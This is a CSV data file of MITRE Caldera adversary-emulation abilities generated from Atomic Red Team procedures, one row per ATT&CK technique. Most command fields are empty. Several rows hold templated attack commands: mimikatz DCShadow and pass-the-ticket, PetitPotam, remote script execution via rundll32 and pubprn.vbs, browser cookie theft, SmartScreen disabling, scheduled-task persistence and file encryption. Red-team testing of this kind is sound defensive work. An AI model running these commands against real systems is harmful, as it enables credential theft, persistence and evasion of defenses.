id,name,description,tactic,technique_attack_id,technique_full_name,windows_command,windows_executor,linux_command,linux_executor,darwin_command,darwin_executor,privilege,payloads,cleanup,target_dir,yml_filename,vars,has_hardcoded_abs_paths_hint
<GENERATE_UUIDv4>,SID-History Injection,Ability for SID-History Injection (ATT&CK T1178). Generated from Atomic Red Team procedures; review and test safely before use.,privilege-escalation,T1178,SID-History Injection,,,,,,,,,,stockpile/data/abilities/privilege-escalation/,T1178__sid-history-injection.yml,,no
<GENERATE_UUIDv4>,Hooking,Ability for Hooking (ATT&CK T1179). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1179,Hooking,,,,,,,,,,stockpile/data/abilities/credential-access/,T1179__hooking.yml,,no
<GENERATE_UUIDv4>,Screensaver,Ability for Screensaver (ATT&CK T1180). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1180,Screensaver,,,,,,,,,,stockpile/data/abilities/persistence/,T1180__screensaver.yml,,no
<GENERATE_UUIDv4>,Extra Window Memory Injection,Ability for Extra Window Memory Injection (ATT&CK T1181). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1181,Extra Window Memory Injection,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1181__extra-window-memory-injection.yml,,no
<GENERATE_UUIDv4>,AppCert DLLs,Ability for AppCert DLLs (ATT&CK T1182). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1182,AppCert DLLs,,,,,,,,,,stockpile/data/abilities/persistence/,T1182__appcert-dlls.yml,,no
<GENERATE_UUIDv4>,Image File Execution Options Injection,Ability for Image File Execution Options Injection (ATT&CK T1183). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1183,Image File Execution Options Injection,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1183__image-file-execution-options-injection.yml,,no
<GENERATE_UUIDv4>,SSH Hijacking,Ability for SSH Hijacking (ATT&CK T1184). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1184,SSH Hijacking,,,,,,,,,,stockpile/data/abilities/lateral-movement/,T1184__ssh-hijacking.yml,,no
<GENERATE_UUIDv4>,Browser Session Hijacking,Ability for Browser Session Hijacking (ATT&CK T1185). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1185,Browser Session Hijacking,,,,,,,,,,stockpile/data/abilities/collection/,T1185__browser-session-hijacking.yml,,no
<GENERATE_UUIDv4>,Process Doppelgänging,Ability for Process Doppelgänging (ATT&CK T1186). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1186,Process Doppelgänging,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1186__process-doppelg-nging.yml,,no
<GENERATE_UUIDv4>,Forced Authentication,Ability for Forced Authentication (ATT&CK T1187). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1187,Forced Authentication,"& ""#{petitpotam_path}"" #{captureServerIP} #{targetServerIP} #{efsApi} Write-Host ""End of PetitPotam attack""",psh,,,,,,,,stockpile/data/abilities/credential-access/,T1187__forced-authentication.yml,,no
<GENERATE_UUIDv4>,Multi-hop Proxy,Ability for Multi-hop Proxy (ATT&CK T1188). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1188,Multi-hop Proxy,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1188__multi-hop-proxy.yml,,no
<GENERATE_UUIDv4>,Drive-by Compromise,Ability for Drive-by Compromise (ATT&CK T1189). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1189,Drive-by Compromise,,,,,,,,,,stockpile/data/abilities/initial-access/,T1189__drive-by-compromise.yml,,no
<GENERATE_UUIDv4>,Exploit Public-Facing Application,Ability for Exploit Public-Facing Application (ATT&CK T1190). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1190,Exploit Public-Facing Application,,,,,,,,,,stockpile/data/abilities/initial-access/,T1190__exploit-public-facing-application.yml,,no
<GENERATE_UUIDv4>,CMSTP,Ability for CMSTP (ATT&CK T1191). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1191,CMSTP,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1191__cmstp.yml,,no
<GENERATE_UUIDv4>,Spearphishing Link,Ability for Spearphishing Link (ATT&CK T1192). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1192,Spearphishing Link,,,,,,,,,,stockpile/data/abilities/initial-access/,T1192__spearphishing-link.yml,,no
<GENERATE_UUIDv4>,Spearphishing Attachment,Ability for Spearphishing Attachment (ATT&CK T1193). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1193,Spearphishing Attachment,,,,,,,,,,stockpile/data/abilities/initial-access/,T1193__spearphishing-attachment.yml,file_or_folder;numeric_mode,no
<GENERATE_UUIDv4>,Spearphishing via Service,Ability for Spearphishing via Service (ATT&CK T1194). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1194,Spearphishing via Service,,,,,,,,,,stockpile/data/abilities/initial-access/,T1194__spearphishing-via-service.yml,,no
<GENERATE_UUIDv4>,Supply Chain Compromise,Ability for Supply Chain Compromise (ATT&CK T1195). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1195,Supply Chain Compromise,"copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db schtasks /create /tn ExplorerSync /tr ""javaw -jar %temp%\..\Microsoft\ExplorerSync.db"" /sc MINUTE /f",psh,,,,,,,,stockpile/data/abilities/initial-access/,T1195__supply-chain-compromise.yml,encrypted_file_path;encryption_alg;input_file_path;pwd_for_encrypted_file,no
<GENERATE_UUIDv4>,Control Panel Items,Ability for Control Panel Items (ATT&CK T1196). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1196,Control Panel Items,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1196__control-panel-items.yml,,no
<GENERATE_UUIDv4>,SIP and Trust Provider Hijacking,Ability for SIP and Trust Provider Hijacking (ATT&CK T1198). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1198,SIP and Trust Provider Hijacking,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1198__sip-and-trust-provider-hijacking.yml,,no
<GENERATE_UUIDv4>,Trusted Relationship,Ability for Trusted Relationship (ATT&CK T1199). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1199,Trusted Relationship,,,,,,,,,,stockpile/data/abilities/initial-access/,T1199__trusted-relationship.yml,,no
<GENERATE_UUIDv4>,Hardware Additions,Ability for Hardware Additions (ATT&CK T1200). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1200,Hardware Additions,,,,,,,,,,stockpile/data/abilities/initial-access/,T1200__hardware-additions.yml,,no
<GENERATE_UUIDv4>,Indirect Command Execution,Ability for Indirect Command Execution (ATT&CK T1202). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1202,Indirect Command Execution,pcalua.exe -a #{process} pcalua.exe -a #{payload_path},psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1202__indirect-command-execution.yml,,no
<GENERATE_UUIDv4>,Exploitation for Client Execution,Ability for Exploitation for Client Execution (ATT&CK T1203). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1203,Exploitation for Client Execution,,,,,,,,,,stockpile/data/abilities/execution/,T1203__exploitation-for-client-execution.yml,,no
<GENERATE_UUIDv4>,User Execution,Ability for User Execution (ATT&CK T1204). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1204,User Execution,"IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso"" -OutFile ""$env:TEMP\qbot-test.iso"") Mount-DiskImage -ImagePath ""$env:TEMP\qbot-test.iso"" $mountedpath = (Get-DiskImage -ImagePath ""$env:TEMP\qbot-test.iso"" | Get-Volume).DriveLetter $finalpath = $mountedpath + "":\"" cd $finalpath .\calc.exe.lnk",psh,,,,,,,,stockpile/data/abilities/execution/,T1204__user-execution.yml,timeout,no
<GENERATE_UUIDv4>,Traffic Signaling,Ability for Traffic Signaling (ATT&CK T1205). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1205,Traffic Signaling,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1205__traffic-signaling.yml,user_account,no
<GENERATE_UUIDv4>,Sudo Caching,Ability for Sudo Caching (ATT&CK T1206). Generated from Atomic Red Team procedures; review and test safely before use.,privilege-escalation,T1206,Sudo Caching,,,,,,,,,,stockpile/data/abilities/privilege-escalation/,T1206__sudo-caching.yml,,no
<GENERATE_UUIDv4>,Rogue Domain Controller,Ability for Rogue Domain Controller (ATT&CK T1207). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1207,Rogue Domain Controller,"# starting fake DC server, as SYSTEM (required) $dc_output_file = ""#{atomics_dir}\..\ExternalPayloads\art-T1207-mimikatz-DC.log"" Remove-Item $dc_output_file -ErrorAction Ignore $mimikatzParam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam"" # wait for fake DC server to be ready... Start-Sleep -Seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" Write-Host ""`nWaiting for fake DC server to return"" Wait-Process $dc Write-Host ""`nOutput from fake DC server:"" Get-Content $dc_output_file Start-Sleep 1 # wait …",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1207__rogue-domain-controller.yml,atomics_dir,no
<GENERATE_UUIDv4>,Kerberoasting,Ability for Kerberoasting (ATT&CK T1208). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1208,Kerberoasting,,,,,,,,,,stockpile/data/abilities/credential-access/,T1208__kerberoasting.yml,cert_filename;key_filename;lazagne_path;output_file;specific_module,yes
<GENERATE_UUIDv4>,Time Providers,Ability for Time Providers (ATT&CK T1209). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1209,Time Providers,,,,,,,,,,stockpile/data/abilities/persistence/,T1209__time-providers.yml,index;pam_rule;path_to_pam_conf,no
<GENERATE_UUIDv4>,Exploitation of Remote Services,Ability for Exploitation of Remote Services (ATT&CK T1210). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1210,Exploitation of Remote Services,,,,,,,,,,stockpile/data/abilities/lateral-movement/,T1210__exploitation-of-remote-services.yml,,no
<GENERATE_UUIDv4>,Exploitation for Defense Evasion,Ability for Exploitation for Defense Evasion (ATT&CK T1211). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1211,Exploitation for Defense Evasion,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1211__exploitation-for-defense-evasion.yml,domain;port,no
<GENERATE_UUIDv4>,Exploitation for Credential Access,Ability for Exploitation for Credential Access (ATT&CK T1212). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1212,Exploitation for Credential Access,,,,,,,,,,stockpile/data/abilities/credential-access/,T1212__exploitation-for-credential-access.yml,binary_path;port,no
<GENERATE_UUIDv4>,Data from Information Repositories,Ability for Data from Information Repositories (ATT&CK T1213). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1213,Data from Information Repositories,,,,,,,,,,stockpile/data/abilities/collection/,T1213__data-from-information-repositories.yml,aws_region;stratus_path,no
<GENERATE_UUIDv4>,Credentials in Registry,Ability for Credentials in Registry (ATT&CK T1214). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1214,Credentials in Registry,,,,,,,,,,stockpile/data/abilities/credential-access/,T1214__credentials-in-registry.yml,,no
<GENERATE_UUIDv4>,Kernel Modules and Extensions,Ability for Kernel Modules and Extensions (ATT&CK T1215). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1215,Kernel Modules and Extensions,,,,,,,,,,stockpile/data/abilities/persistence/,T1215__kernel-modules-and-extensions.yml,,no
<GENERATE_UUIDv4>,System Script Proxy Execution,Ability for System Script Proxy Execution (ATT&CK T1216). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1216,System Script Proxy Execution,"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:#{remote_payload}""",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1216__system-script-proxy-execution.yml,,no
<GENERATE_UUIDv4>,System Binary Proxy Execution,Ability for System Binary Proxy Execution (ATT&CK T1218). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1218,System Binary Proxy Execution,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:#{file_url}"").Exec();window.close();",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1218__system-binary-proxy-execution.yml,atomics_dir;output_file;request_timeout;target;wordlist,no
<GENERATE_UUIDv4>,Remote Access Tools,Ability for Remote Access Tools (ATT&CK T1219). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1219,Remote Access Tools,"Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe $file1 = ""C:\Users\"" + $env:username + ""\Desktop\TeamViewer_Setup.exe"" Start-Process -Wait $file1 /S; Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'",psh,,,,,,,,stockpile/data/abilities/command-and-control/,T1219__remote-access-tools.yml,,no
<GENERATE_UUIDv4>,XSL Script Processing,Ability for XSL Script Processing (ATT&CK T1220). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1220,XSL Script Processing,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}""",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1220__xsl-script-processing.yml,,no
<GENERATE_UUIDv4>,Template Injection,Ability for Template Injection (ATT&CK T1221). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1221,Template Injection,"start ""#{docx_file}""",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1221__template-injection.yml,,no
<GENERATE_UUIDv4>,File and Directory Permissions Modification,Ability for File and Directory Permissions Modification (ATT&CK T1222). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1222,File and Directory Permissions Modification,fsutil behavior set SymlinkEvaluation R2L:1 fsutil behavior set SymlinkEvaluation R2R:1,psh,chmod #{numeric_mode} #{file_or_folder},sh,chmod #{numeric_mode} #{file_or_folder},sh,,,,stockpile/data/abilities/defense-evasion/,T1222__file-and-directory-permissions-modification.yml,,no
<GENERATE_UUIDv4>,Compiled HTML File,Ability for Compiled HTML File (ATT&CK T1223). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1223,Compiled HTML File,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1223__compiled-html-file.yml,,no
<GENERATE_UUIDv4>,Execution Guardrails,Ability for Execution Guardrails (ATT&CK T1480). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1480,Execution Guardrails,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1480__execution-guardrails.yml,,no
<GENERATE_UUIDv4>,Domain Generation Algorithms,Ability for Domain Generation Algorithms (ATT&CK T1483). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1483,Domain Generation Algorithms,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1483__domain-generation-algorithms.yml,,no
<GENERATE_UUIDv4>,Domain or Tenant Policy Modification,Ability for Domain or Tenant Policy Modification (ATT&CK T1484). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1484,Domain or Tenant Policy Modification,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v EnableSmartScreen /t REG_DWORD /d 0 /f reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v ShellSmartScreenLevel /t REG_SZ /d Block /f",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1484__domain-or-tenant-policy-modification.yml,,no
<GENERATE_UUIDv4>,Data Encrypted for Impact,Ability for Data Encrypted for Impact (ATT&CK T1486). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1486,Data Encrypted for Impact,echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt,psh,"echo ""#{pwd_for_encrypted_file}"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}",sh,7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path},sh,,,,stockpile/data/abilities/impact/,T1486__data-encrypted-for-impact.yml,,no
<GENERATE_UUIDv4>,Disk Structure Wipe,Ability for Disk Structure Wipe (ATT&CK T1487). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1487,Disk Structure Wipe,,,,,,,,,,stockpile/data/abilities/impact/,T1487__disk-structure-wipe.yml,,no
<GENERATE_UUIDv4>,Disk Content Wipe,Ability for Disk Content Wipe (ATT&CK T1488). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1488,Disk Content Wipe,,,,,,,,,,stockpile/data/abilities/impact/,T1488__disk-content-wipe.yml,,no
<GENERATE_UUIDv4>,Stored Data Manipulation,Ability for Stored Data Manipulation (ATT&CK T1492). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1492,Stored Data Manipulation,,,,,,,,,,stockpile/data/abilities/impact/,T1492__stored-data-manipulation.yml,,no
<GENERATE_UUIDv4>,Transmitted Data Manipulation,Ability for Transmitted Data Manipulation (ATT&CK T1493). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1493,Transmitted Data Manipulation,,,,,,,,,,stockpile/data/abilities/impact/,T1493__transmitted-data-manipulation.yml,,no
<GENERATE_UUIDv4>,Runtime Data Manipulation,Ability for Runtime Data Manipulation (ATT&CK T1494). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1494,Runtime Data Manipulation,,,,,,,,,,stockpile/data/abilities/impact/,T1494__runtime-data-manipulation.yml,,no
<GENERATE_UUIDv4>,Firmware Corruption,Ability for Firmware Corruption (ATT&CK T1495). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1495,Firmware Corruption,,,,,,,,,,stockpile/data/abilities/impact/,T1495__firmware-corruption.yml,,no
<GENERATE_UUIDv4>,Network Denial of Service,Ability for Network Denial of Service (ATT&CK T1498). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1498,Network Denial of Service,,,,,,,,,,stockpile/data/abilities/impact/,T1498__network-denial-of-service.yml,,no
<GENERATE_UUIDv4>,Compile After Delivery,Ability for Compile After Delivery (ATT&CK T1500). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1500,Compile After Delivery,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1500__compile-after-delivery.yml,,no
<GENERATE_UUIDv4>,Systemd Service,Ability for Systemd Service (ATT&CK T1501). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1501,Systemd Service,,,,,,,,,,stockpile/data/abilities/persistence/,T1501__systemd-service.yml,,no
<GENERATE_UUIDv4>,Parent PID Spoofing,Ability for Parent PID Spoofing (ATT&CK T1502). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1502,Parent PID Spoofing,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1502__parent-pid-spoofing.yml,,no
<GENERATE_UUIDv4>,PowerShell Profile,Ability for PowerShell Profile (ATT&CK T1504). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1504,PowerShell Profile,,,,,,,,,,stockpile/data/abilities/persistence/,T1504__powershell-profile.yml,input_file,no
<GENERATE_UUIDv4>,Server Software Component,Ability for Server Software Component (ATT&CK T1505). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1505,Server Software Component,"$termsrvDll = ""C:\Windows\System32\termsrv.dll"" $ACL = Get-Acl $termsrvDll $permission = ""Administrators"",""FullControl"",""Allow"" $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission $ACL.SetAccessRule($accessRule) Set-Acl -Path $termsrvDll -AclObject $ACL Copy-Item -Path ""C:\Windows\System32\termsrv.dll"" -Destination ""C:\Windows\System32\termsrv_backup.dll"" -ErrorAction Ignore Add-Content -Path ""C:\Windows\System32\termsrv.dll"" -Value ""`n"" -NoNewline -ErrorAction Ignore Move-Item -Path ""C:\Windows\System32\termsrv_backup.dll"" -Destination ""C:\Windows\System32\termsrv.dll"" -Force -ErrorAction Ignore",psh,,,,,,,,stockpile/data/abilities/persistence/,T1505__server-software-component.yml,,no
<GENERATE_UUIDv4>,Web Session Cookie,Ability for Web Session Cookie (ATT&CK T1506). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1506,Web Session Cookie,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1506__web-session-cookie.yml,test_message,yes
<GENERATE_UUIDv4>,Elevated Execution with Prompt,Ability for Elevated Execution with Prompt (ATT&CK T1514). Generated from Atomic Red Team procedures; review and test safely before use.,privilege-escalation,T1514,Elevated Execution with Prompt,,,,,,,,,,stockpile/data/abilities/privilege-escalation/,T1514__elevated-execution-with-prompt.yml,,no
<GENERATE_UUIDv4>,Emond,Ability for Emond (ATT&CK T1519). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1519,Emond,,,,,,,,,,stockpile/data/abilities/persistence/,T1519__emond.yml,,no
<GENERATE_UUIDv4>,Cloud Instance Metadata API,Ability for Cloud Instance Metadata API (ATT&CK T1522). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1522,Cloud Instance Metadata API,,,,,,,,,,stockpile/data/abilities/credential-access/,T1522__cloud-instance-metadata-api.yml,,no
<GENERATE_UUIDv4>,Implant Internal Image,Ability for Implant Internal Image (ATT&CK T1525). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1525,Implant Internal Image,,,,,,,,,,stockpile/data/abilities/persistence/,T1525__implant-internal-image.yml,,no
<GENERATE_UUIDv4>,Cloud Service Discovery,Ability for Cloud Service Discovery (ATT&CK T1526). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1526,Cloud Service Discovery,,,,,,,,,,stockpile/data/abilities/discovery/,T1526__cloud-service-discovery.yml,,no
<GENERATE_UUIDv4>,Application Access Token,Ability for Application Access Token (ATT&CK T1527). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1527,Application Access Token,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1527__application-access-token.yml,,no
<GENERATE_UUIDv4>,Steal Application Access Token,Ability for Steal Application Access Token (ATT&CK T1528). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1528,Steal Application Access Token,,,,,,,,,,stockpile/data/abilities/credential-access/,T1528__steal-application-access-token.yml,,no
<GENERATE_UUIDv4>,System Shutdown/Reboot,Ability for System Shutdown/Reboot (ATT&CK T1529). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1529,System Shutdown/Reboot,shutdown /s /t #{timeout},psh,shutdown -r #{timeout},sh,shutdown -r #{timeout},sh,,,,stockpile/data/abilities/impact/,T1529__system-shutdown-reboot.yml,,no
<GENERATE_UUIDv4>,Data from Cloud Storage,Ability for Data from Cloud Storage (ATT&CK T1530). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1530,Data from Cloud Storage,,,,,,,,,,stockpile/data/abilities/collection/,T1530__data-from-cloud-storage.yml,,yes
<GENERATE_UUIDv4>,Account Access Removal,Ability for Account Access Removal (ATT&CK T1531). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1531,Account Access Removal,net user #{user_account} #{new_user_password} /add net.exe user #{user_account} #{new_password},psh,passwd #{user_account} #enter admin password > enter new password > confirm new password,sh,passwd #{user_account} #enter admin password > enter new password > confirm new password,sh,,,,stockpile/data/abilities/impact/,T1531__account-access-removal.yml,,no
<GENERATE_UUIDv4>,Internal Spearphishing,Ability for Internal Spearphishing (ATT&CK T1534). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1534,Internal Spearphishing,,,,,,,,,,stockpile/data/abilities/lateral-movement/,T1534__internal-spearphishing.yml,,no
<GENERATE_UUIDv4>,Unused/Unsupported Cloud Regions,Ability for Unused/Unsupported Cloud Regions (ATT&CK T1535). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1535,Unused/Unsupported Cloud Regions,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1535__unused-unsupported-cloud-regions.yml,,no
<GENERATE_UUIDv4>,Revert Cloud Instance,Ability for Revert Cloud Instance (ATT&CK T1536). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1536,Revert Cloud Instance,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1536__revert-cloud-instance.yml,,no
<GENERATE_UUIDv4>,Cloud Service Dashboard,Ability for Cloud Service Dashboard (ATT&CK T1538). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1538,Cloud Service Dashboard,,,,,,,,,,stockpile/data/abilities/discovery/,T1538__cloud-service-dashboard.yml,,no
<GENERATE_UUIDv4>,Steal Web Session Cookie,Ability for Steal Web Session Cookie (ATT&CK T1539). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1539,Steal Web Session Cookie,"stop-process -name ""firefox"" -force -erroraction silentlycontinue $CookieDBLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"" ""select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];"" | cmd /c #{sqlite3_path} ""$CookieDBLocation"" | out-file -filepath ""#{output_file}""",psh,,,"killall 'Google Chrome' sleep 1 open -a ""/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/ sleep 1 /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337",sh,,,,stockpile/data/abilities/credential-access/,T1539__steal-web-session-cookie.yml,,no
<GENERATE_UUIDv4>,Pre-OS Boot,Ability for Pre-OS Boot (ATT&CK T1542). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1542,Pre-OS Boot,"echo ""Creating %systemroot%\wpbbin.exe"" New-Item -ItemType File -Path ""$env:SystemRoot\System32\wpbbin.exe""",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1542__pre-os-boot.yml,,no
<GENERATE_UUIDv4>,Event Triggered Execution,Ability for Event Triggered Execution (ATT&CK T1546). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1546,Event Triggered Execution,"reg.exe import ""#{registry_file}""",psh,"bash -c 'trap ""nohup sh $#{atomics_dir}/T1546.005/src/echo-art-fish.sh"" EXIT'",sh,"bash -c 'trap ""nohup sh $#{atomics_dir}/T1546.005/src/echo-art-fish.sh"" EXIT'",sh,,,,stockpile/data/abilities/persistence/,T1546__event-triggered-execution.yml,,no
<GENERATE_UUIDv4>,Use Alternate Authentication Material,Ability for Use Alternate Authentication Material (ATT&CK T1550). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1550,Use Alternate Authentication Material,"""#{mimikatz_exe}"" ""kerberos::ptt #{ticket}""",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1550__use-alternate-authentication-material.yml,,no
